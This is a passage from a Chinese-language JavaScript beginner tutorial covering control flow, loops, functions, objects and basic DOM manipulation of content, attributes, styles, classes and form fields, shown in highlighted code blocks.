title="语句"></a>语句</h2><ol><li><p><strong>分支语句</strong></p><p>分支语句可以让我们有选择性的执行想要的代码</p><p><strong>1）if分支语句</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (time&lt;<span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;b&gt;早上好&lt;/b&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (time&gt;=<span class="number">10</span> &amp;&amp; time&lt;<span class="number">20</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;b&gt;今天好&lt;/b&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;b&gt;晚上好!&lt;/b&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2）三元运算符</strong></p><p>语法：条件**?<strong>代码1（满足条件执行的代码）</strong>:**代码2:（不满足条件执行的代码）</p><p>一般用于赋值</p><p><strong>3）switch语句</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (d)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:x=<span class="string">&quot;今天是星期六&quot;</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:x=<span class="string">&quot;今天是星期日&quot;</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">    <span class="attr">default</span>:</span><br><span class="line">    x=<span class="string">&quot;期待周末&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>    - 注意不要漏掉break，不然程序继续执行下一个case，直到遇到break或switch语句结束。</code></pre></li><li><p><strong>循环语句</strong></p><p>当明确循环次数的时候使用for，不确定的时候使用while(true)</p><p><strong>1）while循环和do&#x2F;while循环</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//先判断再执行</span></span><br><span class="line"><span class="keyword">while</span> (i&lt;<span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line">    x=x + <span class="string">&quot;The number is &quot;</span> + i + <span class="string">&quot;&lt;br&gt;&quot;</span></span><br><span class="line">    i++</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//先执行一次再判断</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    x=x + <span class="string">&quot;The number is &quot;</span> + i + <span class="string">&quot;&lt;br&gt;&quot;</span></span><br><span class="line">    i++</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (i&lt;<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p><strong>2）for循环</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// for循环</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;cars.<span class="property">length</span>;i++)</span><br><span class="line">&#123; </span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(cars[i] + <span class="string">&quot;&lt;br&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// for/in语句遍历对象的属性</span></span><br><span class="line"><span class="keyword">let</span> person = &#123;<span class="attr">fname</span>:<span class="string">&quot;Bill&quot;</span>,<span class="attr">lname</span>:<span class="string">&quot;Gates&quot;</span>,<span class="attr">age</span>:<span class="number">56</span>&#125;; </span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> person)  <span class="comment">// x 为属性名</span></span><br><span class="line">&#123;</span><br><span class="line">    txt = txt + person[x]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3）打破循环</strong></p><ul><li><p><strong>break语句</strong>：直接跳出循环，执行循环之后的代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (i==<span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//if (i==3) break</span></span><br><span class="line">    x=x + <span class="string">&quot;The number is &quot;</span> + i + <span class="string">&quot;&lt;br&gt;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>continue语句</strong>：中断当前循环中的迭代，继续循环下一个迭代</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;=<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (i==<span class="number">3</span>) <span class="keyword">continue</span>;</span><br><span class="line">    x=x + <span class="string">&quot;The number is &quot;</span> + i + <span class="string">&quot;&lt;br&gt;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><ol><li><p><strong>函数的声明</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="comment">// 注意：这样仅仅是声明，只有调用了函数才会执行</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params">let1,let2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        code</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 调用</span></span><br><span class="line"><span class="title function_">myFunction</span>(let1,let2)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong>具名函数和匿名函数</strong></p><p><strong>1）具名函数：function fn() {}</strong></p><ul><li>调用：fn()</li><li>具名函数的调用可以写到任何位置，即可以先调用再声明</li></ul><p><strong>2）匿名函数：function() {}</strong></p><ul><li><p>无法调用</p></li><li><p>使用方式：</p><ul><li><p>函数表达式</p><p>必须先声明再调用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">let</span> fn = <span class="keyword">function</span> (<span class="params">let1,let2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        code</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 调用</span></span><br><span class="line"><span class="title function_">fn</span>(x,y)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>立即执行函数</p><p>不需要调用，直接执行。</p><p><u>多个立即执行函数之间必须要用分号隔开</u></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    (<span class="keyword">function</span> (<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        code</span><br><span class="line">    &#125;)();</span><br><span class="line"><span class="comment">// 注意多了两个括号</span></span><br><span class="line"><span class="comment">// 第一个括号其实就是将函数声明看作函数，后面的括号直接调用函数</span></span><br><span class="line">    (<span class="keyword">function</span> (<span class="params">x,y</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(x + y)</span><br><span class="line">    &#125;)(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><blockquote><p>这样来看的话，立即执行函数好像和直接写顺序代码执行，不封装为函数没有什么区别？</p><p>其实还是有作用的：封装了函数等于构建了一个新的作用域，在这个作用域里面使用的变量和函数外是分离的，可以重复相互不影响。达到了防止变量污染的作用。</p></blockquote></li></ul></li></ul></li></ol><h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><ol><li><p><strong>对象的定义</strong></p><p>对象是一种数据类型，是一种无序的数据的集合，可以用于详细地描述某个事物。</p><ul><li>对象中由<strong>属性和方法</strong>组成</li></ul><p>例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123;</span><br><span class="line">    <span class="comment">// 属性</span></span><br><span class="line">    <span class="attr">firstName</span>:<span class="string">&quot;John&quot;</span>,</span><br><span class="line">    <span class="attr">lastName</span>:<span class="string">&quot;Doe&quot;</span>,</span><br><span class="line">    <span class="attr">age</span>:<span class="number">50</span>,</span><br><span class="line">    <span class="comment">// 方法</span></span><br><span class="line">    fullName : <span class="keyword">function</span>(<span class="params"></span>) </span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="string">&quot; &quot;</span> + <span class="variable language_">this</span>.<span class="property">lastName</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p><strong>对象的使用</strong></p><p>访问对象中的属性值： <code>对象名.属性 </code> 或 <code>对象名[&quot;属性&quot;]</code>（属性名中包含<code>-</code>的时候只能用后者）</p><p>访问方法也是一样的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 增（直接赋值一个新的属性即可）</span></span><br><span class="line">person.<span class="property">hobby</span> = <span class="string">&quot;basketball&quot;</span></span><br><span class="line"><span class="comment">// 删</span></span><br><span class="line"><span class="keyword">delete</span> person.<span class="property">hobby</span></span><br><span class="line"><span class="comment">// 改</span></span><br><span class="line">person.<span class="property">firstName</span> = <span class="string">&quot;isoda&quot;</span></span><br><span class="line"><span class="comment">// 查</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person.<span class="property">firstName</span>)</span><br><span class="line">name = person.<span class="title function_">fullName</span>()</span><br></pre></td></tr></table></figure></li><li><p><strong>对象的遍历</strong></p><p>使用for&#x2F;in语句遍历对象的属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123;<span class="attr">fname</span>:<span class="string">&quot;Bill&quot;</span>,<span class="attr">lname</span>:<span class="string">&quot;Gates&quot;</span>,<span class="attr">age</span>:<span class="number">56</span>&#125;; </span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> person)  <span class="comment">// key 为属性名，为字符串</span></span><br><span class="line">&#123;</span><br><span class="line">    txt = txt + person[key]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意：</p><p>这里<strong>只能用 person[key] 来访问对象</strong>，因为key为字符串，为’fname’,’lname’的形式</p><p>所以不能使用person.key，显示出来就是person.’fname’，这种形式明显是错误的，会得到undefined。而 person[‘fname’]，这种访问方法才是正确的。</p></blockquote></li></ol><h1 id="JS-DOM"><a href="#JS-DOM" class="headerlink" title="JS DOM"></a>JS DOM</h1><h2 id="DOM简介"><a href="#DOM简介" class="headerlink" title="DOM简介"></a>DOM简介</h2><ol><li><p><strong>概念</strong></p><p>DOM（文档对象模型），是浏览器提供的一套专门用来<strong>操作网页内容</strong>的功能（API），通过DOM，JavaScript 可以创建动态的HTML，实现用户的交互：</p><ul><li><p>改变页面中的所有 HTML 元素</p></li><li><p>改变页面中的所有 HTML 属性</p></li><li><p>改变页面中的所有 CSS 样式</p></li><li><p>对页面中的所有事件做出反应</p></li></ul></li><li><p><strong>DOM树</strong></p><p>将HTML文档以树状结构直观的表现出来，即DOM树。可以<strong>直观体现标签和标签之间的关系</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240716143932776.png" alt="image-20240716143932776"></p></li><li><p><strong>DOM对象</strong></p><p>从DOM树上获取到的所有html标签都是<u>JS对象</u>，即DOM对象</p><ul><li>所有的标签属性都可以在这个对象上面找到</li><li><strong>修改这个对象的属性会自动映射到标签身上</strong></li><li>从dom树来看，最大的dom对象就是document对象，document对象下的属性和方法都是用来访问和操作网页内容的，如 <code>document.write（）</code> 用来写入网页内容</li></ul></li></ol><h2 id="获取DOM元素"><a href="#获取DOM元素" class="headerlink" title="获取DOM元素"></a>获取DOM元素</h2><ol><li><p><strong>通过CSS选择器来获取</strong></p><ul><li><p><strong>querySelector</strong>：匹配符合的第一个元素，返回对应的HTML元素对象</p></li><li><p><strong>querySelectorAll</strong>：返回符合的HTML元素对象数组</p><ul><li><p>注意，返回的是一个伪数组，有长度有索引号，但是没有pop和push等方法</p><p>通过p[0]等来访问</p></li><li><p>如果只有一个元素，返回的也是仅有一个元素的伪数组</p></li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="keyword">class</span> = <span class="string">&#x27;box&#x27;</span>&gt;<span class="number">123</span>&lt;/div&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span> = <span class="string">&#x27;box&#x27;</span>&gt;</span>abc<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>导航栏<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 直接获取标签 </span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> box = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;div&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 根据class</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> box = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.box&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(box)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 根据id</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> nav = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#nav&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(nav)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">nav.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;red&#x27;</span><span class="comment">//可以对其直接修改样式属性</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 获取ul下的第一个li，和CSS的选择方法一样</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> li = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;ul li:first-child&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(li)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p><strong>其他获取DOM元素的方式</strong></p><p>以下三种是比较老的写法，目前已经逐渐不再使用了</p><ul><li>通过 id 找到 HTML 元素</li><li>通过标签名找到 HTML 元素</li><li>通过类名找到 HTML 元素</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;nav&#x27;</span>)</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;div&#x27;</span>)</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;w&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ol><h2 id="操作HTML内容"><a href="#操作HTML内容" class="headerlink" title="操作HTML内容"></a>操作HTML内容</h2><ol><li><p><strong>innerText</strong> </p><p>修改文本内容，仅<u>显示纯文本，不解析标签</u></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.box&#x27;</span>).<span class="property">innerText</span> = <span class="string">&#x27;我是一个盒子&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>innerHTML</strong></p><p>修改文本内容，可以解析标签</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.box&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;strong&gt;我是一个盒子&lt;/strong&gt;&#x27;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="操作元素属性"><a href="#操作元素属性" class="headerlink" title="操作元素属性"></a>操作元素属性</h2><ol><li><p><strong>操作元素基本属性</strong></p><p>如src、href、title等</p><ul><li><p>语法： </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对象.属性 = 值</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;img&#x27;</span>).<span class="property">src</span> = <span class="string">&#x27;./images/a.webp&#x27;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>操作元素样式属性CSS</strong></p><p><strong>1）通过style属性操作</strong></p><p>语法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对象.style.样式属性 = 值</span></span><br><span class="line">&lt;div <span class="keyword">class</span> = <span class="string">&quot;box&quot;</span>&gt; &lt;/div&gt;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.box&#x27;</span>).<span class="property">style</span>.<span class="property">width</span> = <span class="string">&#x27;200px&#x27;</span></span><br><span class="line">box.<span class="property">style</span>.<span class="property">backgroundColor</span> = <span class="string">&#x27;hotpink&#x27;</span></span><br></pre></td></tr></table></figure><ul><li><p>属性中存在的数字单位不要忘记添加，如 <code>px</code></p></li><li><p>如果属性中含有 <code>-</code> 连接符，可以去掉 <code>-</code> 然后将后面的首字母大写</p><p>如 <code>background-color</code> 可以改成  <code>backgroundColor</code></p></li></ul><p><strong>2）通过className操作</strong></p><p>当需要修改的样式比较多的时候，逐一修改style属性比较繁琐，可以设置一个新的class，然后将需要修改的标签的class修改为新创建的class</p><p>语法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 元素.className = 新的class名称</span></span><br><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Javascript学习<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="selector-class">.class1</span>&#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">width</span>: <span class="number">200px</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">height</span>: <span class="number">200px</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">background-color</span>: <span class="number">#fff</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="selector-class">.class2</span>&#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">width</span>: <span class="number">300px</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">height</span>: <span class="number">300px</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">background-color</span>:skyblue;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">margin</span>: <span class="number">100px</span> auto;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">padding</span>: <span class="number">10px</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;class1&quot;</span>&gt;</span>我是文字的内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">const</span> box = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;div&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        box.<span class="property">className</span> = <span class="string">&#x27;class2&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">console</span>.<span class="title function_">log</span>(box)<span class="comment">// 打印出来的class属性为 class2</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ul><li><p>注意这里使用的是className，因为class是关键字</p></li><li><p>属性新值换旧值，这里的class1会被class2覆盖掉</p><p><strong>如果不想覆盖，可以这样修改：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">box.<span class="property">className</span> = <span class="string">&#x27;class1 class2&#x27;</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>3）通过classList操作</strong></p><p>可以直接追加、删除或者切换类名</p><p>语法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 追加一个类</span></span><br><span class="line">元素.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;类名&#x27;</span>)</span><br><span class="line"><span class="comment">// 删除一个类</span></span><br><span class="line">元素.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;类名&#x27;</span>)</span><br><span class="line"><span class="comment">// 切换一个类</span></span><br><span class="line"><span class="comment">// 检查有没有使用这个类，如果有就删除，没有就加上（像灯反复按开关一样）</span></span><br><span class="line">元素.<span class="property">classList</span>.<span class="title function_">toggle</span>(<span class="string">&#x27;类名&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li><p><strong>操作表单元素属性</strong></p><p>1）有很多时候需要修改表单的属性，如点击眼睛可以看到密码文本内容，本质就是将password类型转换为text</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">表单.<span class="property">value</span> = <span class="string">&#x27;用户名&#x27;</span></span><br><span class="line">表单.<span class="property">value</span> = <span class="string">&#x27;password&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>注意，使用innerHTML是不能获取到表单内容的，只能通过value来获取</li></ul><p>2）表单属性中添加就有效果，移除就没有效果，一律使用布尔值表示。如果为true代表添加了该属性如果是false代表移除了该属性。如点击全选就勾选所有的内容</p><p>如 disabled. checked 、selected，<u>只接受布尔值</u></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 